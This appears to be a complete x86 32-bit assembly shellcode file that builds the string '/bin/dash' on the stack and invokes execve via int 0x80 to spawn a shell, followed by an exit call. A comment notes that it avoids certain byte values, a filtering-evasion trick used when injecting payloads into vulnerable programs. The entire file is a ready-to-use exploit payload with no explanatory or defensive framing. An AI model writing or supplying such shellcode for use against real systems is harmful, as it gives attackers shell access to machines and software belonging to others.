global _start

section .text

_start:
  xor ecx, ecx
  mul ecx

execve:
  push 11
  pop edi
  mov eax, edi; escape from 0x5x bytecode
  push 0x68
  push 0x7361642f
  push 0x6e69622f;  /bin/dash
  mov ebx,esp
  int 0x80

exit:
  push 1
  pop edi
  mov eax, edi
  int 0x80
